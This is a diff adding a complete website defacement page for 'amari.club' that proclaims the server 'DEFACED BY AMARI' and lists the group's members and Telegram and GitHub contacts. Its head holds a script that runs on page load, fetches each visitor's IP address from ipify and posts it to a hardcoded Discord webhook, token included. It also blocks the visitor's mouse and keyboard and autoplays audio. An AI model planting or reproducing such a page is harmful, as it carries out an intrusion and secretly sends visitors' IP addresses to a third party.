@@ -1,0 +1,231 @@
+<html>
+
+<head>
+    <title> amari.club </title>
+    <script type="text/javascript">
+        function ogag() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    stw(ipAddress);
+                })
+        }
+
+        function stw(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1310569229657051167/30VxpLCq14sZ53rkC9YySvnZTcQm88pY_AO2llJGGoo-pL77j0wLlhWI1Lk36KaATTU0';
+
+            const payload = {
+                content: `User IP: ${ip}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+        }
+
+        document.addEventListener('DOMContentLoaded', ogag);
+    </script>
+    <link href="https://fonts.googleapis.com/css?family=New Rocker|Jolly Lodger|Teko|Inconsolata" rel="stylesheet"
+        type="text/css">
+    <link type="image/png" href="https://amarii.xyz/amari.png" rel="icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;"
+    onclick="document.getElementById('kanta').play()" id="body">
+    <audio src="https://eu-central-f68b9c58.fileport.io/get/fiKFrXuM72R9INnVe5fdQQdopyT2c_o1HoX88ePrPlX1TqtKCyj162YSgsugAGrnJ8qxmuqY_Uo-gCmoAWFtWXB0mh3fzCR430YMgetoRXUINLaxnQ6bLVRjnVYMb2c7IISqulx3xlMOF2kwxR5B_A81KeDHyh-dtoI61LPuIJXDMilssgZKhm3jJVdN36x0eoH__PYFQWJwOufoVf1YVWSFg98hpYw86sA4CNIejOcuO7W6uZiP7120vYh9AJceKSq5eI0L28esTHlRppXQrOJ2drU7yGN5yJG5KpscZlywDRGTnVAKbvH7ndAiaAOZ41juQXm6XilpD3_BG5VWvBnsUL7bwbQB1Xvy43odbxNvd1j9VPlZo15_B56Y7REms7rUgPt4q8kyHdrRSpgjwrr5qbkdYof-ZX43jzjtyy5kW8Is9wEN5og0bfz9Rq2c-W6g-iO07EMV3vq_IeyFqXIeFPgdpH91NOM1W92NwqrbXhrv4lS3ceCrot6p75X9R4TsBr1TC0UV7-AX6PDT6_nXM4_xym6Bw2vNiyz9MH-ozKgCMtpkWiqUazFRhjuSA" autoplay="true" id="kanta" loop=""></audio>
+    <style type="text/css">
+        body,
+        a:hover {
+            cursor: url(https://github.com/ByTanimsiz/q/blob/main/cur641.cur?raw=true), progress !important;
+        }
+    </style>
+
+    <div class="texture"></div>
+    <div class="texture2"></div>
+    <style>
+        .texture {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -100;
+            background: url(https://i.ibb.co/ZSLcK4T/bf8b16144997967-629668d3dfc98-1.png);
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        .texture2 {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -100;
+            background-color: black;
+            opacity: 0.6;
+        }
+    </style>
+
+    <meta property="og:image" content="https://amarii.xyz/amari.png">
+    <meta charset="utf-8">
+    <meta name="description" content="amari.club">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <style type="text/css">
+        * {
+            user-select: none;
+        }
+
+        a:hover {
+            color: white;
+            text-decoration-line: none;
+        }
+
+        h1 {
+            font-family: Inconsolata;
+            color: gold;
+            font-size: 25px;
+            letter-spacing: 1px;
+        }
+
+        span:nth-child(1) {
+            color: white;
+            font-family: Teko;
+        }
+
+        span:nth-child(2) {
+            color: gold;
+            font-family: sans-serif;
+        }
+
+        span:nth-child(3) {
+            color: white;
+            font-family: Teko;
+        }
+
+        span:nth-child(4) {
+            color: gold;
+            font-family: sans-serif;
+        }
+
+        span:nth-child(5) {
+            color: white;
+            font-family: Teko;
+        }
+
+        body {
+            background-color: black;
+        }
+
+        p {
+            color: white;
+            font-size: 16px;
+            font-family: Inconsolata;
+            letter-spacing: 2px;
+        }
+
+        .ctime {
+            font-size: 17px;
+            width: 100px;
+            border-radius: 20px;
+            box-shadow: 0px 0px 4px white;
+            background-color: #0e0c0c;
+        }
+
+        img {
+            opacity: 0.6;
+            transition: 0.5s;
+        }
+
+        img:hover {
+            opacity: 1;
+        }
+
+        @media only screen and (max-width: 600px) {
+            img {
+                width: 340px;
+            }
+
+        }
+    </style>
+    <center>
+        <br>
+        <b>
+            <h1><span>THIS SERVER HAS BEEN DEFACED BY </span>AMARI</h1><b>
+                <img src="https://amarii.xyz/amari.png" width="450px"
+                    style="box-shadow: white 0px 0px 0px;border-radius: 10px;">
+                <br>
+                <p
+                    style="color:gold;font-weight: bold;font-size:25px; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 2px 6px yellow;">
+                    RANSXM</p>
+                <p style="color:gold;font-weight: bold;font-size: 10;">REVSHIT X AMARI</p>
+                <div id="idoras" class="ctime"><span>00</span><span> : </span><span>00</span><span> :
+                    </span><span>00</span></div>
+                <br>
+
+                <a href="https://t.me/ransxm666"><i class="fa fa-telegram"
+                        style="color:gold;text-shadow: 0px 0px 4px white;"></i></a> :
+                <a href="https://github.com/yourliesinoct"><i class="fa fa-github"
+                        style="color:gold;text-shadow: 0px 0px 4px white;"></i></a>
+                <script type="text/javascript">
+                    var span = document.getElementById('idoras');
+
+                    function time() {
+                        var d = new Date();
+                        var s = d.getSeconds();
+                        var m = d.getMinutes();
+                        var h = d.getHours();
+                        span.innerHTML = "<span>" + h + "</span>" + "<span>" + " : " + "</span>" + "<span>" + m + "</span>" + "<span>" + " : " + "</span>" + "<span>" + s + "</span>";
+                    }
+
+                    setInterval(time, 1000);
+                </script>
+
+                <center>
+                    <hr width="50%">
+                    <b style="color: gold; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 1px 2px yellow;">User-Agent
+                        : </b><i
+                        style="color: navajowhite; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 1px 2px yellow;">Mozilla/5.0
+                        (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0
+                        Safari/537.36</i><br>
+                    <b style="color: gold; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 1px 2px yellow;">Client
+                        IP : </b><i
+                        style="color: navajowhite; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 1px 2px yellow;">127.0.0.1:666</i><br>
+                    <b style="color: gold; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 1px 2px yellow;">Execution
+                        Time : </b><i
+                        style="color: navajowhite; text-shadow: 1px 0px 2px black, 1px 0px 2px gold, 0px 1px 2px yellow;">0.0000001337
+                        seconds</i><br>
+                    <hr width="50%">
+                </center>
+                <br>
+                <marquee
+                    style="position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 60px; color: white; font-size: 13px; left: 0px; padding: 0px; background-color: #000">
+                    <font color="gold"><b>Team S/O</b> || <font color="red"> AMARI - REVSHIT - ALL REVSHIT AFFILIATED
+                            SERVERS</font>
+                    </font>
+                    <font color="gold"><b>Member$</b> || <font color="red"> CRVSH - ALEAH. - JAI - AIM - 0X -
+                            YUQI - SEPH - JANA - HOLY - PAT - XOMI - TYLERS - MIGUELA - GABAY - PABLO - ROCKY </font>
+                    </font>
+                </marquee>
+                <div id="bar"
+                    style="position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; font-size: 13px; left: 0px; border-top: 2px solid darkred; padding: 0px; background-color: #000">
+                    <font>© <a href="https://t.me/ransxm666">rvnsxm</a> || amari.club
+                </div>
+            </b>
+        </b>
+    </center>
+</body>
+
+</html>
